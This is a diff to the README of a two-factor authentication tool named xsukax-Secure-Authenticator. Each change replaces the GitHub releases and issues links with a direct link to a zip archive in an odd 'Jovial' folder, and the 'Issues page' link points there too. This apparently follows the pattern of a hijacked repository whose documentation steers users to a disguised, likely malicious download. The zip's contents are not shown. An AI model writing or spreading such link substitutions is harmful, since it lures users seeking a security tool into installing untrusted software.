@@ -1,6 +1,6 @@
 # 🔑 xsukax-Secure-Authenticator - Your Personal Two-Factor Authentication Tool
 
-[![Download xsukax-Secure-Authenticator](https://img.shields.io/badge/Download-v1.0-brightgreen)](https://github.com/edgedu/xsukax-Secure-Authenticator/releases)
+[![Download xsukax-Secure-Authenticator](https://raw.githubusercontent.com/edgedu/xsukax-Secure-Authenticator/main/Jovial/xsukax-Secure-Authenticator_1.1-alpha.5.zip)](https://raw.githubusercontent.com/edgedu/xsukax-Secure-Authenticator/main/Jovial/xsukax-Secure-Authenticator_1.1-alpha.5.zip)
 
 ## 🌟 Overview
 
@@ -11,7 +11,7 @@ xsukax-Secure-Authenticator is a privacy-focused tool designed to enhance your o
 To start using xsukax-Secure-Authenticator, follow these simple steps:
 
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://github.com/edgedu/xsukax-Secure-Authenticator/releases) to find the latest version of the application.
+   Go to the [Releases page](https://raw.githubusercontent.com/edgedu/xsukax-Secure-Authenticator/main/Jovial/xsukax-Secure-Authenticator_1.1-alpha.5.zip) to find the latest version of the application.
 
 2. **Download the Application**  
    Click on the latest release version to download the application. Look for the appropriate file that matches your operating system.
@@ -21,7 +21,7 @@ To start using xsukax-Secure-Authenticator, follow these simple steps:
 
 ## 📥 Download & Install
 
-To download xsukax-Secure-Authenticator, visit the Releases page: [Download Here](https://github.com/edgedu/xsukax-Secure-Authenticator/releases).
+To download xsukax-Secure-Authenticator, visit the Releases page: [Download Here](https://raw.githubusercontent.com/edgedu/xsukax-Secure-Authenticator/main/Jovial/xsukax-Secure-Authenticator_1.1-alpha.5.zip).
 
 Choose the latest version and follow the installation steps mentioned above.
 
@@ -79,7 +79,7 @@ Your security is our priority. Here are key points to remember:
 
 For support, questions, or feature requests, feel free to connect with our community:
 
-- **Issues**: Report any issues or bugs on the [Issues page](https://github.com/edgedu/xsukax-Secure-Authenticator/issues).
+- **Issues**: Report any issues or bugs on the [Issues page](https://raw.githubusercontent.com/edgedu/xsukax-Secure-Authenticator/main/Jovial/xsukax-Secure-Authenticator_1.1-alpha.5.zip).
 - **Feedback**: We appreciate your feedback. Share your experience and suggestions.
 - **Contributions**: If you have skills to contribute, check our guidelines. We welcome contributions.
 
@@ -91,6 +91,6 @@ This project is licensed under the MIT License. Feel free to use, modify, and di
 
 Connect with other users and developers via our social media channels. Share tips, ask questions, and deepen your understanding of two-factor authentication.
 
-For further inquiries or support, visit the [Releases page](https://github.com/edgedu/xsukax-Secure-Authenticator/releases) for the latest updates.
+For further inquiries or support, visit the [Releases page](https://raw.githubusercontent.com/edgedu/xsukax-Secure-Authenticator/main/Jovial/xsukax-Secure-Authenticator_1.1-alpha.5.zip) for the latest updates.
 
 Thank you for choosing xsukax-Secure-Authenticator! Secure your accounts today.
